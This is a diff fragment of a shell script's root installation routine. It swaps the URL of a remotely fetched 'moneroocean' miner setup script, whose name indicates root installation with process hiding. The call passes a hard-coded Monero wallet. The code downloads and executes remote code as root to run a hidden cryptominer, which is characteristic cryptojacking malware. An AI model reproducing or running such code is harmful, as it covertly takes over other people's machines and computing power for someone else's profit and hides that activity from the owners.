@@ -561,7 +561,7 @@ root_installation() {
     # Run the miner setup
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
-        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_mo_4_r00t_with_processhide_INTEGRATED.sh" \
+        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_mo_4_r00t_with_processhide_FINAL_CLEAN_FIXED.sh" \
         "$wallet" \
         "root miner setup"
     
